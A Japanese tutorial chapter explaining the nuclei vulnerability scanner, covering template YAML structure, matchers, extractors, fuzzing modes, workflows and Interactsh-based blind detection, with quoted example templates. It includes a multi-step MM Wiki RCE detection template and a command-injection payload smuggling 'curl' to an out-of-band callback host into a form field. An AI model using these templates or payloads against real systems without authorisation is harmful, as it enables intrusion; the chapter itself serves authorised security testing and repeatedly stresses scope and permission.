## nuclei入門：YAMLベース脆弱性スキャナの基礎

### この章で学ぶこと

バグバウンティやセキュリティ診断を「自動化基盤」に載せるとき、真っ先に検討すべきツールが **nuclei** です。nucleiは、ProjectDiscoveryが開発したオープンソースの脆弱性スキャナで、検出ロジックをYAML形式の「テンプレート」として定義し、そのテンプレートに従ってリクエストを送信し、レスポンスをパターンマッチングして脆弱性・構成ミス・機微情報の露出などを検出します。単発のスキャナとして使うだけでなく、「一度見つけた脆弱性パターンをテンプレート化し、数千のターゲットに再現性高く展開する」という発想がnucleiの核心であり、この再利用性こそが自動化基盤における価値の源泉です。

本節では、nucleiの内部の仕組み、基本的な使い方、テンプレートのYAML構造、マッチャー（matcher, レスポンスが条件を満たすかを判定する仕組み）とエクストラクター（extractor, レスポンスから値を抜き出して後続処理に渡す仕組み）の書き方を、原典のコード例を引用しながら解説します。次節以降で扱うカスタムテンプレート実践やOOB（Out-of-Band, 即時応答のない盲目的な検出手法）連携の土台となる内容です。

### nucleiとは何か、なぜ強力なのか

nucleiは「fast, template based vulnerability scanner」として公式に説明されており、以下の特徴を持ちます。

- シンプルなYAML形式で検出シナリオ（テンプレート）を記述・共有できる
- 世界中のセキュリティ専門家が数千のテンプレートをコミュニティに提供している（`nuclei-templates`リポジトリ）
- 誤検知（false positive）を減らすための「実世界を模したリクエスト」の送信機構を持つ
- 高速な並列スキャンが可能で、大規模なターゲット群への一括適用に向く
- CI/CDパイプラインに組み込んで継続的にスキャンできる

> 出典: ProjectDiscovery nuclei GitHub本体 — https://github.com/projectdiscovery/nuclei

重要なのは、nucleiが「汎用的な脆弱性判定AI」ではなく、**あくまでテンプレートに書かれたリクエストとマッチ条件を機械的に実行するだけのエンジン**だという点です。検出力はテンプレートの質に比例します。既製のテンプレート集をそのまま流すだけでは「よくある構成ミス・既知CVE」しか拾えず、逆にいえば、カスタムテンプレートを書ける人がnucleiの真価を引き出せます（この点は次項で詳述します）。

### インストールと基本コマンド

nucleiはGo言語製のCLIツールで、Go 1.24.2以上の環境であれば以下でインストールできます（2026年時点の公式リポジトリの記載に基づく。Goのバージョン要件はリリースごとに引き上げられるため、実行時は必ず公式READMEの最新要件を確認してください）。

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

`v3`というメジャーバージョンがパスに含まれていることに注意してください。nucleiはv2からv3への移行でテンプレート構文やDSL(Domain Specific Language, テンプレート内で条件式を書くための専用のミニ言語)の一部仕様が変わっており、古い記事のテンプレート例がそのまま動かないことがあります。本節のコード例はv3系のドキュメント・ブログ記事から採取したものです。

基本的な実行例は次の通りです。

```bash
# 単一ターゲットのスキャン
nuclei -target https://example.com

# 複数ターゲット(リスト)のスキャン
nuclei -list urls.txt

# ネットワーク(CIDR)全体のスキャン
nuclei -target 192.168.1.0/24

# 自作テンプレートを指定して実行
nuclei -u https://example.com -t /path/to/your-template.yaml
```

> 出典: ProjectDiscovery nuclei GitHub本体 — https://github.com/projectdiscovery/nuclei

**なぜ`-list`のような一括指定が重要か**: nucleiの設計思想は「1つのテンプレートを大量のターゲットに適用する」ことにあります。個々のURLに対して手動でリクエストを送るのではなく、ターゲットリストとテンプレート(またはテンプレート集)の直積(デカルト積)を高並列に処理するアーキテクチャになっているため、スコープ内資産が多いプログラムほど効果を発揮します。ただし、この特性は裏を返せば「無許可の大量スキャン」を極めて容易にしてしまうため、実行前に必ずスコープ内資産であることを確認し、対象プログラムのレート制限・スキャン許可ポリシーに従う必要があります。許可のない本番環境や第三者サービスへの一括スキャンは行ってはいけません。

nucleiが対応するプロトコル(検出対象の通信方式)は、HTTP、DNS、TCP、SSL/TLS、WHOIS、WebSocket、さらにJavaScript実行やヘッドレスブラウザ(headless)、コード実行(code)ベースの検出まで多岐にわたります。これにより、単純なHTTPレスポンス検査だけでなく、DNSレコードの誤設定検査やTLS証明書の問題、SPA(シングルページアプリケーション)上でのみ発火するクライアントサイドの問題まで、幅広い検出シナリオを1つのエンジンで扱えます。

### テンプレートの最小構造

nucleiテンプレートは、次の4要素を骨格として持ちます。

> "Templates need to contain some essential information that can be summarized as: Template id, Template info, What data to send to the remote host, Instructions on how to analyze the response"

つまり「①テンプレートの識別子、②メタ情報、③何を送るか、④応答をどう判定するか」の4点です。最小限の実例として、公開されている`.htpasswd`ファイル露出を検出するテンプレートを見てみます。

```yaml
id: htpasswd

info:
  name: Detect exposed .htpasswd files
  author: geeknik
  severity: info
  tags: config,exposure

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.htpasswd"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - ":{SHA}"
          - ":$apr1$"
          - ":$2y$"
        condition: or

      - type: status
        status:
          - 200
```

> 出典: The Ultimate Guide to Finding Bugs With Nuclei — https://projectdiscovery.io/blog/ultimate-nuclei-guide

このテンプレートの動きを仕組みレベルで分解すると次のようになります。

- `id`: テンプレート同士を一意に識別するキー。スキャン結果のレポートやワークフローからの参照に使われるため、スペースを含まない短い英数字が推奨されます。
- `info`: 人間向けのメタデータ。`severity`(深刻度: info/low/medium/high/critical)は後述するレポーティングやトリアージの優先順位付けに直結し、`tags`は大量のテンプレートから特定カテゴリ(例: `exposure`, `cve`, `misconfig`)だけを`-tags`オプションで絞り込む際のフィルタキーになります。
- `requests`: 実際に送信するHTTPリクエストの定義。`{{BaseURL}}`はテンプレートエンジンが実行時にターゲットのベースURLへ置換する変数(プレースホルダ)です。これにより1つのテンプレートを任意のターゲットに使い回せます。
- `matchers`: レスポンスに対する判定条件。`matchers-condition: and`は「複数あるmatchersブロックを全てANDで満たす必要がある」ことを示し、この例では「`.htpasswd`特有のハッシュ形式の文字列が本文に含まれる」かつ「ステータスコードが200」の両方が真のときのみ検出成立とします。`type: word`のmatcher内部では`condition: or`が指定されており、3つの文字列パターンのうちいずれか1つが一致すればこのmatcherブロック自体はtrueになります。

**なぜこの二段階の条件(matchers内はOR、matchers間はAND)が重要か**: `.htpasswd`ファイルは存在してもコンテンツが空だったり、Webサーバがカスタム404ページを返すのにステータスが200になる、といった誤検知源が多数あります。「ファイルらしき内容が含まれる」ことと「HTTPステータスが正常応答である」ことの両方を要求することで、単純な文字列一致だけよりも誤検知率を大きく下げられます。これは「実世界を模したリクエストとマッチ条件で誤検知を最小化する」というnucleiの設計思想そのものの具体例です。

### matcherの種類とDSL

nucleiのmatcherにはいくつかの型があり、単純な文字列一致から複雑な論理式まで表現できます。

```yaml
matchers:
  - type: word
    words:
      - 'User-agent:'
      - 'Disallow:'
  - type: dsl
    dsl:
      - "len(body)>=140 && status_code==200"
```

> 出典: Bugcrowd "The Ultimate Beginner's Guide to Nuclei" — https://www.bugcrowd.com/blog/the-ultimate-beginners-guide-to-nuclei/

主なmatcherタイプは次の通りです。

| type | 判定内容 |
|---|---|
| `status` | HTTPステータスコードの一致 |
| `word` | 本文やヘッダ中の特定文字列の有無 |
| `regex` | 正規表現によるパターン一致 |
| `dsl` | DSL式による動的・複合条件の評価 |
| `xpath` | HTML/XML構造からの要素抽出・一致判定 |

このうち`dsl`は特に強力です。DSLはnuclei独自の軽量な式言語で、`len(body) > 109`のような長さ比較や、`contains(body,'MM Wiki Version')`のような文字列包含判定、論理演算子(`&&`, `||`)を組み合わせられます。**なぜDSLが必要か**: word matcherやregex matcherは「単一の条件」を表現するのに向きますが、「本文が140文字以上、かつステータスが200」のような複合条件や、後述する複数リクエストにまたがる条件(`body_1`, `body_5`のようにリクエスト番号でレスポンスを参照する)を表現するには、より柔軟な式評価エンジンが必要になります。DSLはこの隙間を埋めるための仕組みです。

### extractorによる値の抽出と再利用

多くの脆弱性検出は「1回のリクエストで完結しない」ことがあります。例えばCSRFトークンを取得してからログインし、ログイン後のセッションで初めて到達できるエンドポイントを叩く、といった多段階の検証が必要な場合です。nucleiはこれを`extractors`と`internal: true`の組み合わせで実現します。

```yaml
extractors:
  - type: regex
    name: csrftoken
    part: body
    internal: true  # 後続リクエストで使用
    group: 1
    regex:
      - 'csrftoken" value="([a-f0-9]{10})'
```

抽出した値は、後続のリクエストブロック内で`{{csrftoken}}`のように変数として参照できます。

```yaml
- |
  POST {{Path}}/backup_db.php HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded

  backup_name=test&csrftoken={{csrftoken}}
```

> 出典: The Ultimate Guide to Finding Bugs With Nuclei — https://projectdiscovery.io/blog/ultimate-nuclei-guide

**仕組みとしてのポイント**: `internal: true`が指定されたextractorは、スキャン結果として画面に表示されるのではなく、テンプレート実行エンジン内部の変数プールに格納されるだけになります。これにより、「レスポンス本文から正規表現でCSRFトークンを抜き出し、次のリクエストのボディに埋め込む」という、通常はブラウザやスクリプトで手動実装するようなステートフルな処理を、YAML定義だけで表現できます。`xpath`型のextractorも同様の目的で使え、HTMLのDOM構造をXPathで指定して特定要素の属性値(`attribute: value`)を取り出せます。

### マルチステップ検証テンプレートの実例

CSRFトークンの抽出と複数リクエストの連鎖を組み合わせた、より実践的な例として、認証付きRCE(Remote Code Execution, リモートからの任意コード実行)を検出するテンプレートが公開されています。

```yaml
id: mmwiki-rce

info:
    name: MM Wiki DB Backup Remote Code Execution
    author: me
    severity: critical
    description: Detect MM Wiki database backup RCE vulnerability

requests:
  - raw:
    - |
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}

    - |
      POST {{Path}}/register.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded

      username=65aca3e27440558a&password=65aca3e27440558a

    - |
      POST {{Path}}/login.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded

      username=65aca3e27440558a&password=65aca3e27440558a

    - |
      GET {{Path}}/backup_db.php HTTP/1.1
      Host: {{Hostname}}

    - |
      POST {{Path}}/backup_db.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded

      backup_name=test123456&submit=Create+Backup&csrftoken={{csrftoken}}

    redirects: true
    cookie-reuse: true
    extractors:
      - type: regex
        name: csrftoken
        part: body
        internal: true
        group: 1
        regex:
          - 'csrftoken" value="([a-f0-9]{10})'
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body_1,'MM Wiki Version')"
          - "contains(body_5,'downloadbackup.php?f=dbbackup-')"
        condition: and
```

> 出典: The Ultimate Guide to Finding Bugs With Nuclei — https://projectdiscovery.io/blog/ultimate-nuclei-guide

このテンプレートで押さえておくべき仕組みは3点です。

1. **`raw`モードによるリクエスト連鎖**: `method`/`path`形式ではなく、生のHTTPリクエスト文字列をそのまま複数個並べることで、レジスタ登録→ログイン→バックアップ機能へのアクセス、という一連の操作フローを1テンプレート内で表現しています。`cookie-reuse: true`により、1つ目のリクエストで発行されたSet-Cookieが後続リクエストに自動的に引き継がれ、ブラウザのセッション挙動を模倣します。
2. **`req-condition: true`とインデックス付き変数**: 通常のmatcherは最後のレスポンスだけを見ますが、`req-condition: true`を指定すると、DSL式の中で`body_1`(1番目のリクエストのレスポンス本文)、`body_5`(5番目のリクエストのレスポンス本文)のように、リクエスト単位でレスポンスを参照できるようになります。「複数のリクエスト/レスポンスにまたがる条件を論理式として組み合わせられる」という原文の説明の通り、これによって「最初のレスポンスにアプリケーション固有の文字列が含まれ、かつ最後のレスポンスにバックアップファイルへのリンクが含まれる」という、多段階の証跡を1つの判定式にまとめられます。
3. **クリティカルな重要度の妥当性**: `severity: critical`は、この検出が単なる情報露出ではなく実際のコード実行につながることを示しています。severityの選定はテンプレート作成者の裁量に委ねられますが、実際の影響(この場合はRCE)と釣り合った深刻度を設定することが、後段のトリアージ・レポーティングの精度に直結します。

なお、このような多段階の認証・登録処理を伴うテンプレートを実際のスコープ内資産に対して実行する際は、テスト用アカウントの作成やバックアップファイルの生成など、対象システムに副作用を及ぼす操作が含まれる可能性があるため、プログラムの許可範囲とルール・オブ・エンゲージメント(ROE)を必ず確認してから実行してください。許可のない環境に対してこの種の破壊的・副作用のあるリクエストを送ってはいけません。

### ファジングとペイロード注入

nucleiは固定のリクエストを送るだけでなく、ワードリストを使ったファジング(fuzzing, 多数の入力パターンを機械的に試す手法)にも対応しています。

```yaml
id: my-test-nuclei-template

info:
    name: X Debug header fuzzing
    author: me
    severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        x-{{fuzz}}-debug: 1

    payloads:
        fuzz: /var/tmp/fuzz.txt
    attack: batteringram
    redirects: true
    stop-at-first-match: false
    matchers:
      - type: dsl
        dsl:
          - "len(body) > 109"
```

> 出典: The Ultimate Guide to Finding Bugs With Nuclei — https://projectdiscovery.io/blog/ultimate-nuclei-guide

`payloads`で指定したワードリストファイルの各行が`{{fuzz}}`という変数に順次代入され、リクエストが繰り返し送信されます。`attack`キーは複数のペイロード変数がある場合の組み合わせ方を制御するモードで、次の3種類があります。

- **batteringram**: 1つのペイロードリストを、テンプレート内のすべての注入ポイントに同時に適用する
- **pitchfork**: 複数のペイロードリストを、同じインデックス同士で並列に1行ずつ組み合わせる
- **clusterbomb**: 複数のペイロードリストの全組み合わせ(直積)を総当たりで試す

**なぜモード選択が重要か**: `clusterbomb`は網羅性が高い一方でリクエスト数が組み合わせ爆発的に増え、対象サーバへの負荷やレート制限抵触のリスクが高まります。逆に`pitchfork`はリクエスト数を抑えつつ、あらかじめ関連付けられたペイロードの組(例: ユーザー名とパスワードのペア)を効率よく試せます。テンプレート設計時には、検出したい脆弱性の性質とターゲットへの負荷のバランスを見て攻撃モードを選ぶ必要があります。

### ワークフローによる条件分岐スキャン

単一テンプレートだけでなく、複数テンプレートを条件分岐でつなげる「workflows」という仕組みもあります。

```yaml
workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: wordpress
        subtemplates:
          - template: cves/CVE-2019-6715.yaml
          - template: cves/CVE-2019-9978.yaml
          - tags: wordpress
```

> 出典: The Ultimate Guide to Finding Bugs With Nuclei — https://projectdiscovery.io/blog/ultimate-nuclei-guide

これは「まず技術スタック検出テンプレートを実行し、対象がWordPressだと判定された場合にのみ、WordPress固有のCVEテンプレート群を追加実行する」というフィンガープリンティング駆動のスキャン戦略です。**なぜこれが効率的か**: すべてのターゲットに全テンプレートを無差別に投げるのではなく、まず軽量な技術検出で対象の性質を絞り込み、該当する場合にのみ重いテンプレート群を実行することで、無駄なリクエスト数を削減し、スキャン全体の実行時間と対象への負荷を抑えられます。これは自動化基盤を大規模運用する上で欠かせない考え方です。

### Interactshによるblind脆弱性検出

即座にレスポンスへ結果が現れないタイプの脆弱性(blind SQLインジェクション、blind SSRF、非同期のコマンドインジェクションなど)は、通常のmatcherだけでは検出できません。nucleiはProjectDiscoveryが提供するOOB(Out-of-Band)インタラクション追跡サービス「Interactsh」と統合されており、外部からのDNS/HTTPコールバックを検出トリガーに使えます。

```yaml
- |
  POST {{Path}}/backup_db.php HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded

  backup_name=test;curl+{{interactsh-url}};echo&csrftoken={{csrftoken}}

matchers:
  - type: word
    part: interactsh_protocol
    words:
      - "http"
```

> 出典: The Ultimate Guide to Finding Bugs With Nuclei — https://projectdiscovery.io/blog/ultimate-nuclei-guide

**仕組み**: `{{interactsh-url}}`はテンプレート実行時に、nucleiが自動生成する一意なInteractshドメイン(例: `abc123.oast.pro`のような形式)に置換されます。このペイロードがターゲットのサーバサイドで実行され(この例では`curl`コマンドとしてOSコマンドインジェクションが成立した場合)、対象サーバから当該ドメインへDNSクエリまたはHTTPリクエストが飛べば、Interactshのリスナーがそれを捕捉します。matcher側では`part: interactsh_protocol`を指定し、実際にどのプロトコル(http/dns)でコールバックが観測されたかを判定条件にすることで、「レスポンス本文には何も現れないが、確かにサーバサイドでコマンドが実行された」ことを間接的に証明できます。

Bugcrowdの解説記事も同様に、Interactshとの統合によって「即座のレスポンスがない脆弱性」の発見が可能になる点を強調しており、blind SQLインジェクションやDNS exfiltration(データのDNSクエリ経由での外部送出)の検出にこの仕組みが使われるとしています。

> 出典: Bugcrowd "The Ultimate Beginner's Guide to Nuclei" — https://www.bugcrowd.com/blog/the-ultimate-beginners-guide-to-nuclei/

この種のOOBペイロードを含むテンプレートは、対象システムに実際のコマンド実行を引き起こす可能性があるため、スコープ内であっても本番データの破壊や意図しない副作用を招かないよう、ペイロードの内容(`echo`で即座に無害化する、書き込み系コマンドを避けるなど)を慎重に設計する必要があります。許可のない対象や、影響範囲が読めないペイロードを本番環境に投げてはいけません。

### テンプレートのデバッグとバリデーション

自作テンプレートは、実際にスキャンへ投入する前に構文検証しておくべきです。

```bash
# YAML構文とスキーマの妥当性チェック
nuclei -validate -t my-template.yaml

# 実際の送受信内容を確認しながらデバッグ実行
nuclei -u target.site -t my-template.yaml -debug
```

> 出典: The Ultimate Guide to Finding Bugs With Nuclei — https://projectdiscovery.io/blog/ultimate-nuclei-guide

`-debug`オプションは送信した生リクエストと受信した生レスポンスを標準出力に表示するため、matcherが意図通りに一致しない場合の原因切り分け(正規表現のエスケープミス、`part`の指定間違い、ヘッダの大文字小文字の違いなど)に必須のワークフローです。テンプレート開発は「書いて即座に大量スキャンに投入する」のではなく、まず単一の検証済みターゲット(自分の管理下にあるラボ環境や、許可を得た検証環境)に対して`-debug`付きで動作確認し、`-validate`で構文エラーがないことを確認してから、スコープ内資産への本番スキャンに移行するという段階的な手順を踏むべきです。

### まとめ

nucleiは「YAMLで検出ロジックを記述し、大規模ターゲット群に再現性高く適用する」ことを目的としたスキャンエンジンです。本節で見たように、テンプレートは`id`/`info`/`requests`/`matchers`という最小骨格の上に、`extractors`による値の抽出・再利用、`req-condition`による複数リクエストの複合判定、`payloads`によるファジング、`workflows`による条件分岐、Interactshによるblind検出という機能を積み重ねることで、単純な既知パターン検出から、認証を伴う多段階の脆弱性検証まで表現できます。既製のコミュニティテンプレート集をそのまま流すだけでは得られない検出力は、こうしたカスタムテンプレートの設計能力から生まれます。次節では、このテンプレート機構を使って実際に自動化パイプラインへ組み込み、継続的な資産監視・差分検知の仕組みを構築する方法を扱います。
